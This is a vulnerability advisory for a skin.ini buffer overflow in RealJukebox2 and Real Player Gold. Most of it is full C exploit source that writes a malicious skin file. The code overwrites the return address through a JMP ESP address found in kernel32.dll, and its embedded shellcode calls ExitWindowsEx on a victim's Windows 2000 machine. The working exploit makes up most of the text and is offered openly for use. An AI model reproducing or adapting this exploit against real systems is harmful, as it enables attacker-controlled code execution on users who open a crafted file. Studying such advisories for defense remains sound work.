source: http://www.securityfocus.com/bid/5217/info

Real Software has announced a vulnerability in RealJukebox2 and Real Player Gold.

A buffer overflow condition exists due to insufficient bounds checking of fields in skinfiles. There is an unchecked buffer for the "CONTROLnImage" field of the "skin.ini" file. By supplying an overly long filename as a value for this field, it is possible to overwrite stack variables. An attacker may exploit this condition to overwrite the return address with a pointer to embedded attacker-supplied instructions.

To exploit this issue the attacker must transmit the maliciously constructed skinfile to a victim of the attack. This may be done via a webpage or HTML e-mail. Exploitation of this issue may result in execution of attacker-supplied instructions with the privileges of the user opening the malicious skinfile. 

/*===========================================================
   RealJukebox2 1.0.2.379 Exploit
     for Windows Windows2000 Professional (Service Pack 2)
   The Shadow Penguin Security (http://www.shadowpenguin.org)
   Written by UNYUN (unyun@shadowpenguin.org)
  ============================================================
*/

#include <stdio.h>
#include <windows.h>

#define MAXBUF          4096
#define KERNEL_NAME     "kernel32.dll"
#define SKIN_INI        "skin.ini"
#define INI_FILE \
"[MAIN]\n"\
"Application=RealJukebox\n"\
"Version=2\n"\
"SkinFamilyCount=5\n"\
"\n"\
"CONTROL1Image=%s\n"

#define NOP             0x90
#define FAKE_OFS1       36
#define FAKE_VAL1       0x7FFDF0F0
#define RETADR_OFS      28
#define CODE_OFS        60
#define RETADR_2000pro  0x77e0af64

static unsigned char egg_2000pro[512]={
  0xB8,0xA5,0xFA,0xE1,0x77,0x33,0xDB,0xB3,
  0x04,0x53,0x53,0xFF,0xD0,0x90,0xEB,0xFD,
  0x00
};

unsigned int search_mem(unsigned char *st,unsigned char *ed,
                unsigned char c1,unsigned char c2)
{
    unsigned char   *p;
    unsigned int    adr;

    for (p=st;p<ed;p++)
        if (*p==c1 && *(p+1)==c2){
            adr=(unsigned int)p;
            if ((adr&0xff)==0) continue;
            if (((adr>>8)&0xff)==0) continue;
            if (((adr>>16)&0xff)==0) continue;
            if (((adr>>24)&0xff)==0) continue;
            return(adr);
        }
    return(0);
}

void valset(char *buf,unsigned int val)
{
    buf[0]=val&0xff;
    buf[1]=(val>>8)&0xff;
    buf[2]=(val>>16)&0xff;
    buf[3]=(val>>24)&0xff;
}

int main(int argc,char *argv[])
{
    FILE            *fp;
    char            buf[MAXBUF];
    unsigned int    tgt,exw;
    unsigned char   *kp;

    if ((fp=fopen(SKIN_INI,"wb"))==NULL){
        printf("Can not write file.\n");
        exit(1);
    }
    memset(buf,NOP,sizeof(buf));
    buf[sizeof(buf)-1]='\0';

    if ((kp=(unsigned char *)LoadLibrary(KERNEL_NAME))==NULL){
        printf("Can not find %s\n",KERNEL_NAME);
        exit(1);
    }
    tgt=search_mem(kp,kp+0x100000,0xff,0xe4);
    if (tgt==0) tgt=RETADR_2000pro;
    printf("kp            = 0x%x\n",kp);
    printf("JMP ESP addr  = 0x%x\n",tgt);
    exw=(unsigned int)ExitWindowsEx;
    printf("ExitWindowsEx = 0x%x\n",exw);

    valset(buf+FAKE_OFS1,FAKE_VAL1);
    valset(buf+RETADR_OFS,tgt);
    valset(egg_2000pro+1,exw);
    strncpy(buf+CODE_OFS,egg_2000pro,strlen(egg_2000pro));

    fprintf(fp,INI_FILE,buf);
    fclose(fp);
    printf("Created '%s'.\n",SKIN_INI);
    return(0);
}
